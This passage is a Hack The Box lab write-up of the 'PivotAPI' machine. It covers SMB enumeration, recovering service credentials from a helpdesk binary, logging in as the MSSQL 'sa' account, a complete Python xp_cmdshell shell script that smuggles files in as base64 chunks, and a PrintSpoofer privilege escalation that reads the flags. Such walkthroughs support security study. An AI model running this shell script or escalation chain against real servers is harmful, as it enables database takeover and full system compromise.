SMB         10.10.10.240    445    PIVOTAPI         SYSVOL          READ            Recurso compartido del servidor de inicio de sesión </code></pre>
                                <p>
                                    We have <code class="highlighter-rouge">read</code> access of three <code class="highlighter-rouge">shares</code>. let's check the <code class="highlighter-rouge">NETLOGON</code> first.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi/HelpDesk]
└──╼ [★]$ smbclient //10.10.10.240/NETLOGON -U kaorz%Roper4155 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  8 05:42:28 2020
  ..                                  D        0  Sat Aug  8 05:42:28 2020
  HelpDesk                            D        0  Sun Aug  9 10:40:36 2020

                7779839 blocks of size 4096. 3497512 blocks available
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Sun Aug  9 10:40:36 2020
  ..                                  D        0  Sun Aug  9 10:40:36 2020
  Restart-OracleService.exe           A  1854976  Fri Feb 19 04:52:01 2021
  Server MSSQL.msg                    A    24576  Sun Aug  9 06:04:14 2020
  WinRM Service.msg                   A    26112  Sun Aug  9 06:42:20 2020

                7779839 blocks of size 4096. 3497512 blocks available</code></pre>
                                <p>
                                    We have three <code class="highlighter-rouge">files</code> in the HelpDesk <code class="highlighter-rouge">Directory</code> let's get these all files into our <code class="highlighter-rouge">system</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">smb: \HelpDesk\> get Restart-OracleService.exe
getting file \HelpDesk\Restart-OracleService.exe of size 1854976 as Restart-OracleService.exe (338.5 KiloBytes/sec) (average 338.5 KiloBytes/sec)
smb: \HelpDesk\> get "Server MSSQL.msg"
getting file \HelpDesk\Server MSSQL.msg of size 24576 as Server MSSQL.msg (67.6 KiloBytes/sec) (average 321.7 KiloBytes/sec)
smb: \HelpDesk\> get "WinRM Service.msg"
getting file \HelpDesk\WinRM Service.msg of size 26112 as WinRM Service.msg (71.8 KiloBytes/sec) (average 307.0 KiloBytes/sec)
smb: \HelpDesk\> ^C
┌───[us-free-1]─[10.10.14.5]─[root@parrot]─[~/Desktop/HTB/pivotapi/HelpDesk]
└──╼ [★]$ ls
 Restart-OracleService.exe  'Server MSSQL.msg'  'WinRM Service.msg'</code></pre>
                                <p>
                                    Now for <code class="highlighter-rouge">extracting</code> the text inside <code class="highlighter-rouge">.msg</code> file we need <code class="highlighter-rouge">msgconvert</code> let's first install that.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">sudo apt-get install libemail-outlook-message-perl libemail-sender-perl</code></pre>
                                <p>
                                    Now let's <code class="highlighter-rouge">extract</code> the text inside <code class="highlighter-rouge">.msg</code> file.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">msgconvert Server\ MSSQL.msg</code></pre>
                                <h2>Server MSSQL.msg</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">Date: Sun, 09 Aug 2020 11:04:14 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16208820270.2cBBDf6.24456
Content-Transfer-Encoding: 7bit
Subject: Server MSSQL
To: cybervaca@licordebellota.htb &#x3C;cybervaca@licordebellota.htb>

Good afternoon,
Due to the problems caused by the Oracle database installed in 2010 in Windows, it has been decided to migrate to MSSQL at the beginning of 2020.
Remember that there were problems at the time of restarting the Oracle service and for this reason a program called "Reset-Service.exe" was created to log in to Oracle and restart the service.
 
Any doubt do not hesitate to contact us.
Greetings,
The HelpDesk Team</code></pre>
                                <h2>WinRM Service.msg</h2>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">Date: Sun, 09 Aug 2020 11:42:20 +0000
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary=16208825850.f7f5B6.27939
Content-Transfer-Encoding: 7bit
Subject: WinRM Service
To: helpdesk@licordebellota.htb &#x3C;helpdesk@licordebellota.htb>

Good afternoon. 
After the last pentest, we have decided to stop externally displaying WinRM's service. Several of our employees are the creators of Evil-WinRM so we do not want to expose this service... We have created a rule to block the exposure of the service and we have also blocked the TCP, UDP and even ICMP output (So that no shells of the type icmp are used.)
Greetings,

The HelpDesk Team</code></pre>
                                <p>
                                    Now afer reading the <code class="highlighter-rouge">both</code> messages i known that Due to some problems by <code class="highlighter-rouge">Oracle</code> database installed in <code class="highlighter-rouge">2010</code> they migrate to <code class="highlighter-rouge">MSSQL</code> at the beginning of <code class="highlighter-rouge">2020</code>.
                                </p>
                                <p>
                                    And they also said that there was a <code class="highlighter-rouge">problems</code> at the time of restarting the <code class="highlighter-rouge">Oracle</code> service and for this reason a program called <code class="highlighter-rouge">"Reset-Service.exe"</code> was created to log in to Oracle and <code class="highlighter-rouge">restart</code> the service.
                                </p>
                                <p>
                                    It's mean that the <code class="highlighter-rouge">"Reset-Service.exe"</code> has creads for <code class="highlighter-rouge">Oracle</code> database becuase it's need to login into <code class="highlighter-rouge">oracle</code> database and without <code class="highlighter-rouge">creads</code> it can't be possible.
                                </p>
                                <p>
                                    And the other message tell that they stop <code class="highlighter-rouge">externally</code> displaying WinRM's service and they also created a rule to block the <code class="highlighter-rouge">exposure</code> of the service and we have also blocked the <code class="highlighter-rouge">TCP</code>, UDP and even <code class="highlighter-rouge">ICMP</code> output So that no shells of the type <code class="highlighter-rouge">icmp</code> are used.
                                </p>
                                <p>
                                    Now let's go to my <code class="highlighter-rouge">Commando-VM</code> and analize the <code class="highlighter-rouge">binary</code>.
                                </p>
                                <p>
                                    I already <code class="highlighter-rouge">transfer</code> the binary into my <code class="highlighter-rouge">Commando-VM</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    First let's <code class="highlighter-rouge">monitor</code> the binary with <code class="highlighter-rouge">procmon</code> so we known that what's the <code class="highlighter-rouge">binary</code> doing.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window1.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window2.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    If you <code class="highlighter-rouge">analize</code> the output you find that the <code class="highlighter-rouge">binary</code> create a file inside <code class="highlighter-rouge">"AppData\Local\Temp\"</code> directory with the random name <code class="highlighter-rouge">everytime</code> and then it's <code class="highlighter-rouge">delete</code> the bat file.
                                </p>
                                <p>
                                    So for <code class="highlighter-rouge">getting</code> that random <code class="highlighter-rouge">bat</code> file we need to stop the <code class="highlighter-rouge">binary</code> before it's delete that <code class="highlighter-rouge">bat</code> file So for that i use <code class="highlighter-rouge">CMDWatcher</code>.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="https://www.kahusecurity.com/tools.html" target="_blank">CMD Watcher</a>
                                </blockquote>
                                <p>
                                    Select the <code class="highlighter-rouge">Interactive</code> mode and then start the <code class="highlighter-rouge">monitoring</code> and then execute the <code class="highlighter-rouge">binary</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window3.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Click <code class="highlighter-rouge">resume</code> the process.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window4.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    You got the <code class="highlighter-rouge">bat</code> file location go to that <code class="highlighter-rouge">location</code> in your file manager.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window5.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Copy <code class="highlighter-rouge">both</code> file into your <code class="highlighter-rouge">desktop</code> in any folder.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window6.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    I <code class="highlighter-rouge">copy</code> both files inside my <code class="highlighter-rouge">desktop/files</code> folder and then <code class="highlighter-rouge">resume</code> the process.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window7.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Now let's <code class="highlighter-rouge">analize</code> the bat file.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode1.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode2.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    The bat file has <code class="highlighter-rouge">encrypted</code> text which he store in <code class="highlighter-rouge">c:\programdata\oracle.txt</code> file and from that file they start the for <code class="highlighter-rouge">loop</code> which remove the spaces and write the output inside <code class="highlighter-rouge">restart-service.exe</code> binary and then delete all the files with <code class="highlighter-rouge">restart-service.exe</code>.
                                </p>
                                <p>
                                    And we also need that file <code class="highlighter-rouge">restart-service.exe</code> because it's contain the creads of <code class="highlighter-rouge">oracle-DB</code>.
                                </p>
                                <p>
                                    So for that we need to <code class="highlighter-rouge">edit</code> the bat file so they don't <code class="highlighter-rouge">remove</code> any file or <code class="highlighter-rouge">binary</code>.
                                </p>
                                <h2>Step 1</h2>
                                <p>
                                    Remove all these <code class="highlighter-rouge">if</code> statement.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode3.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    And add <code class="highlighter-rouge">"goto correcto"</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode4.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <h2>Step 2</h2>
                                <p>
                                    Now in <code class="highlighter-rouge">bottom</code> of the file remove these <code class="highlighter-rouge">del</code> statements.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode5.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    After <code class="highlighter-rouge">removing</code> the del statements they <code class="highlighter-rouge">look</code> like this.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/vscode6.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Now we good to go open a <code class="highlighter-rouge">cmd</code> and run that <code class="highlighter-rouge">bat</code> file to create the <code class="highlighter-rouge">restart-service.exe</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">COMMANDO Fri 05/14/2021  7:41:07.78
C:\Users\DEDSEC\Desktop\files>dir
 Volume in drive C has no label.
 Volume Serial Number is 7EAC-CBDE

 Directory of C:\Users\DEDSEC\Desktop\files

05/14/2021  07:25 AM    &lt;DIR>          .
05/14/2021  07:25 AM    &lt;DIR>          ..
05/14/2021  07:39 AM         1,729,970 542B.bat
05/14/2021  07:22 AM                 0 542C.tmp
               2 File(s)      1,729,970 bytes
               2 Dir(s)  113,196,924,928 bytes free

COMMANDO Fri 05/14/2021  7:41:09.00
C:\Users\DEDSEC\Desktop\files>.\542B.bat
COMMANDO Fri 05/14/2021  7:41:59.20
C:\Users\DEDSEC\Desktop\files></code></pre>
                                <p>
                                    Now let's check if <code class="highlighter-rouge">restart-service.exe</code> is created or not.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window8.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    And we got the <code class="highlighter-rouge">restart-service.exe</code>. I use <code class="highlighter-rouge">API Monitor</code> for analize this binary.
                                </p>
                                <blockquote>
                                    <code class="highlighter-rouge">Link</code> : <a href="http://www.rohitab.com/apimonitor" target="_blank">API Monitor</a>
                                </blockquote>
                                <p>
                                    Check all <code class="highlighter-rouge">API filters</code> on the left side.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window9.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Now click on <code class="highlighter-rouge">monitor</code> new process and select the binary called <code class="highlighter-rouge">restart-service.exe</code>.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window10.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Now we <code class="highlighter-rouge">capture</code> all the proccess and <code class="highlighter-rouge">calls</code> so let's analize this.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window11.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Found the <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">password</code>.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">#Time of Day Thread Module API Return Value Error Duration
CreateProcessWithLogonW ( "svc_oracle", "", "#oracle_s3rV1c3!2010", 0, NULL, ""c:\windows\system32\cmd.exe" /c sc.exe stop OracleServiceXE; sc.exe start OracleServiceXE", 0, NULL, "C:\ProgramData", 0x000000000234e120, 0x0000000003f61c68 )  FALSE   1326 = The user name or password is incorrect.</code></pre>
                                <p>
                                    <strong>svc_oracle:#oracle_s3rV1c3!2010</strong>
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/window12.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    Now if you see <code class="highlighter-rouge">nmap</code> result there is a <code class="highlighter-rouge">mssql</code> port open let's try to <code class="highlighter-rouge">connect</code> with that.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.3]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ mssqlclient.py -port 1433 svc_oracle@10.10.10.240
Impacket v0.9.23.dev1+20210416.153120.efbe78bb - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(PIVOTAPI\SQLEXPRESS): Line 1: Login failed for user 'svc_oracle'.</code></pre>
                                <p>
                                    Login <code class="highlighter-rouge">failed!</code> it's mean the username and <code class="highlighter-rouge">password</code> is not correct.
                                </p>
                                <p>
                                    After that i read the Server <code class="highlighter-rouge">MSSQL.msg</code> again and i found that now they using mssql not <code class="highlighter-rouge">oracle</code> so we need to change the password from <code class="highlighter-rouge">#oracle_s3rV1c3!2010</code> to <code class="highlighter-rouge">#mssql_s3rV1c3!2020</code> because they migrate to <code class="highlighter-rouge">MSSQL</code> at the beginning of <code class="highlighter-rouge">2020</code>.
                                </p>
                                <p>
                                    And for the <code class="highlighter-rouge">username</code> i search on google for default <code class="highlighter-rouge">mssql</code> username and i found that.
                                </p>
                                <p>
                                    <img class="lozad" src=/hackthebox/pivotapi/web.png
                                        alt="Pivotapi.htb" />
                                </p>
                                <p>
                                    So now the creads are <code class="highlighter-rouge">sa:#mssql_s3rV1c3!2020</code> so now let's try to <code class="highlighter-rouge">login</code> with these creads.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.3]─[root@parrot]─[~/Desktop/HTB/pivotapi]
└──╼ [★]$ mssqlclient.py -port 1433 sa@10.10.10.240
Impacket v0.9.23.dev1+20210416.153120.efbe78bb - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> </code></pre>
                                <p>
                                    If we type <code class="highlighter-rouge">help</code> we can see that we can execute the <code class="highlighter-rouge">xp_cmdshell {cmd}</code> command let's try that.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
     
SQL> xp_cmdshell whoami
output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress                                                        

NULL                                                                               

SQL> </code></pre>
                                <p>
                                    We can <code class="highlighter-rouge">execute</code> command let's check the <code class="highlighter-rouge">privileges</code> we have.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">SQL> xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

INFORMACIÓN DE PRIVILEGIOS                                                         

--------------------------                                                         

NULL                                                                               

Nombre de privilegio          Descripción                                       Estado          

============================= ================================================= =============   

SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado   

SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado   

SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado   

SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada      

SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada      

SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada      

SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada      

SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado   

NULL                                                                               

SQL> </code></pre>
                                <p>
                                    It's output in <code class="highlighter-rouge">persian</code> language let's <code class="highlighter-rouge">translate</code> it.
                                </p>
                                <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">Privilege name                Description                                       State         

============================= ================================================= =============   

SeAssignPrimaryTokenPrivilege Replace a process-level token                     Disabled

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled  

SeMachineAccountPrivilege     Add workstations to the domain                    Disabled   

SeChangeNotifyPrivilege       Skip walkthrough check                            Enabled      

SeManageVolumePrivilege       Perform volume maintenance tasks                  Enabled      

SeImpersonatePrivilege        Impersonate a client after authentication         Enabled      

SeCreateGlobalPrivilege       Create global objects                             Enabled      

SeIncreaseWorkingSetPrivilege Increase the workspace of a process               Disabled</code></pre>
                                    <p>
                                        We have <code class="highlighter-rouge">SeImpersonatePrivilege</code> enabled let's try to <code class="highlighter-rouge">privilege-escalation</code> with this.
                                    </p>
                                    <blockquote>
                                        <code class="highlighter-rouge">Link</code> : <a href="https://github.com/dievus/printspoofer" target="_blank">PrintSpoofer</a>
                                    </blockquote>
                                    <p>
                                        But the <code class="highlighter-rouge">problem</code> is we can't transfer this file <code class="highlighter-rouge">directly</code> because firewall blocks all <code class="highlighter-rouge">connections</code>.
                                    </p>
                                    <p>
                                        So i search on <code class="highlighter-rouge">google</code> for script that will login us in <code class="highlighter-rouge">mssql</code> and we can also <code class="highlighter-rouge">upload</code> files inside that and i found a <code class="highlighter-rouge">python</code> script.
                                    </p>
                                    <blockquote>
                                        <code class="highlighter-rouge">Link</code> : <a href="https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py" target="_blank">Mssql_Shell.py</a>
                                    </blockquote>
                                    <p>
                                        I edit the <code class="highlighter-rouge">script</code> because when we use <code class="highlighter-rouge">UPLOAD</code> command it's <code class="highlighter-rouge">break</code>.
                                    </p>
                                    <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-python line-numbers">#!/usr/bin/env python
from __future__ import print_function
import _mssql
import base64
import shlex
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass
from base64 import encodebytes

MSSQL_SERVER="10.10.10.240"
MSSQL_USERNAME = "sa"
MSSQL_PASSWORD = "#mssql_s3rV1c3!2020"
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = list(row)
        if row[columns[-1]]:
            print(row[columns[-1]])
        else:
            print()
    if len(rows) >= 3:
        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
        cwd = rows[-2][list(rows[-3])[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = b"".join(base64.b64encode(data).split()).decode()

    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd
        
        while True:
            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if not cmd:
                cmd = "call" # Dummy cmd command
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) &#x3C; 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd
            
    except _mssql.MssqlDatabaseException as e:
        if  e.severity &#x3C;= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()


shell()
sys.exit()</code></pre>
                                    <p>
                                        Now let's <code class="highlighter-rouge">run</code> the script.
                                    </p>
                                    <p>
                                        <img class="lozad" src=/hackthebox/pivotapi/cmd2.png
                                            alt="Pivotapi.htb" />
                                    </p>
                                    <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.3]─[root@parrot]─[/opt/printspoofer]
└──╼ [★]$ python dedsec.py 
/opt/printspoofer/dedsec.py:3: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated since Python 3.3, and in 3.10 it will stop working
  import _mssql
Successful login: sa@10.10.10.240
Trying to enable xp_cmdshell ...
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> whoami
nt service\mssql$sqlexpress
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> </code></pre>
                                    <p>
                                        We got the <code class="highlighter-rouge">shell</code> now let's try to <code class="highlighter-rouge">UPLOAD</code> the file inside <code class="highlighter-rouge">TEMP</code> directory.
                                    </p>
                                    <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">┌───[us-free-1]─[10.10.14.3]─[root@parrot]─[/opt/printspoofer]
└──╼ [★]$ python dedsec.py 
/opt/printspoofer/dedsec.py:2: DeprecationWarning: Using or importing the ABCs from 'collections' instead of from 'collections.abc' is deprecated since Python 3.3, and in 3.10 it will stop working
  import _mssql
Successful login: sa@10.10.10.240
Trying to enable xp_cmdshell ...
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\Windows\system32> cd /temp
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> UPLOAD PrintSpoofer.exe C:\TEMP\printspoofer.exe
Uploading PrintSpoofer.exe to C:\TEMP\printspoofer.exe
Data length (b64-encoded): 35.3359375KB
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 40.0/40.0 [00:01&#x3C;00:00, 24.50KB/s]
Longitud de entrada = 36208
EncodeToFile devolvi¾ Este archivo ya existe. 0x80070050 (WIN32: 80 ERROR_FILE_EXISTS)
CertUtil: -decode error del comando: 0x80070050 (WIN32: 80 ERROR_FILE_EXISTS)
CertUtil: Este archivo ya existe.
MD5 hashes match: 755af01d6f1c793d28275ec8b914687c
*** UPLOAD PROCEDURE FINISHED *** 
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> </code></pre>
                                    <p>
                                        Now let's run the <code class="highlighter-rouge">binary</code> and get our <strong>user.txt</strong> and <strong>root.txt</strong>.
                                    </p>
                                    <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> printspoofer.exe -i -c "powershell -c type C:\Users\3v4Si0N\Desktop\user.txt"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
4855ef51169f74e4d5d79befd933d719
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> </code></pre>
                                    <pre><code data-src="plugins/highlight-keywords/prism-highlight-keywords.js" class="language-php line-numbers">CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> printspoofer.exe -i -c "powershell -c type C:\users\cybervaca\Desktop\root.txt"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
b32c5e3ee389ee920f6aa1efa025048d
CMD MSSQL$SQLEXPRESS@PIVOTAPI C:\temp> </code></pre>









                                <p>
                                    <p>And we <code class="highlighter-rouge">pwned</code> it …….</p>
                                    <p>
                                        <img src="/assets/img/sample/complete.gif" alt="Complete">
                                    </p>
                                    <p>
                                        If u liked the writeup.Support a Student to Get the <code class="highlighter-rouge">OSCP-Cert</code>
                                        <a href="https://0xdedinfosec.github.io/tabs/donation/" target="_blank">Donation for OSCP</a>
                                    </p>
                                    <h1 id="resources">Resources</h1>
                                <table>
                                    <thead>
                                        <tr>
                                            <th>Topic
                                            <th>
                                                Url
                                    <tbody>
                                        <tr>
                                            <td>CMD Watcher
                                            <td>
                                                <a href="https://www.kahusecurity.com/tools.html"
                                                    target="_blank">https://www.kahusecurity.com/tools.html</a>
                                        <tr>
                                            <td>API Monitor
                                            <td>
                                                <a href="http://www.rohitab.com/apimonitor"
                                                    target="_blank">http://www.rohitab.com/apimonitor</a>
                                        <tr>
                                            <td>PrintSpoofer
                                            <td>
                                                <a href="https://github.com/dievus/printspoofer"
                                                    target="_blank">https://github.com/dievus/printspoofer</a>
                                        <tr>
                                            <td>Mssql_Shell.py
                                            <td>
                                                <a href="https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py"
                                                    target="_blank">https://github.com/Alamot/code-snippets/blob/master/mssql/mssql_shell.py</a>
                                </table>
                    </div>
                    <div class="post-tail-wrapper text-muted">
                        <div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2">
                            <div class="license-wrapper">
                                <span class="license-text ml-1 mr-1">
                                    This post is licensed under 
                                    <a href="https://creativecommons.org/licenses/by/4.0/">
                                        CC BY 4.0 <i class="fab fa-creative-commons"></i>
                                        <i class="fab fa-creative-commons-by"></i>
                                    </a>
                                </span>
                            </div>
                            <!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License -->
                            <div class="share-wrapper">
                                <span class="share-label ml-1 mr-1">Share</span>
                                <span class="share-icon">
                                    <a href="#" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank">
                                        <i class="fa-fw fab fa-twitter mr-1"></i>
                                    </a>
                                    <a href="https://www.facebook.com/dedsecinfoServices/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank">
